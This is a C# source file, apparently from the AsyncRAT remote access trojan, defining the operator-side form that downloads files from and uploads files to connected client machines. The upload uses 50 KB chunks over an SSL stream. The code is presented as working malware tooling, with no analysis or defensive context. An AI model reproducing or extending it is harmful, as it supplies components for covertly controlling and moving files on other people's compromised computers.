using AsyncRAT_Sharp.Sockets;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net.Sockets;
using Timer = System.Threading.Timer;
using AsyncRAT_Sharp.Helper;

namespace AsyncRAT_Sharp.Forms
{
    public partial class FormDownloadFile : Form
    {
        public FormDownloadFile()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients C { get; set; }
        public long dSize = 0;
        private long BytesSent = 0;
        public string fullFileName;
        public string clientFullFileName;
        private bool isUpload = false;
        private async void timer1_Tick(object sender, EventArgs e)
        {
            if (!isUpload)
            {
                labelsize.Text = $"{Methods.BytesToString(dSize)} \\ {Methods.BytesToString(C.BytesRecevied)}";
                if (C.BytesRecevied >= dSize)
                {
                    labelsize.Text = "Downloaded";
                    labelsize.ForeColor = Color.Green;
                    timer1.Stop();
                    await Task.Delay(1500);
                    this.Close();
                }
            }
            else
            {
                labelsize.Text = $"{Methods.BytesToString(dSize)} \\ {Methods.BytesToString(BytesSent)}";
                if (BytesSent >= dSize)
                {
                    labelsize.Text = "Uploaded";
                    labelsize.ForeColor = Color.Green;
                    timer1.Stop();
                    await Task.Delay(1500);
                    this.Close();
                }
            }
        }

        private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                C?.Disconnected();
                timer1?.Dispose();
            }
            catch { }
        }

        public void Send(object obj)
        {
            lock (C.SendSync)
            {
                try
                {
                    isUpload = true;
                    byte[] msg = (byte[])obj;
                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    C.ClientSocket.Poll(-1, SelectMode.SelectWrite);
                    C.ClientSslStream.Write(buffersize);
                    C.ClientSslStream.Flush();
                    int chunkSize = 50 * 1024;
                    byte[] chunk = new byte[chunkSize];
                    using (MemoryStream buffereReader = new MemoryStream(msg))
                    {
                        BinaryReader binaryReader = new BinaryReader(buffereReader);
                        int bytesToRead = (int)buffereReader.Length;
                        do
                        {
                            chunk = binaryReader.ReadBytes(chunkSize);
                            bytesToRead -= chunkSize;
                            C.ClientSslStream.Write(chunk);
                            C.ClientSslStream.Flush();
                            BytesSent += chunk.Length;
                        } while (bytesToRead > 0);

                        binaryReader.Close();
                        C?.Disconnected();
                    }
                }
                catch
                {
                    C?.Disconnected();
                }
            }
        }
    }
}
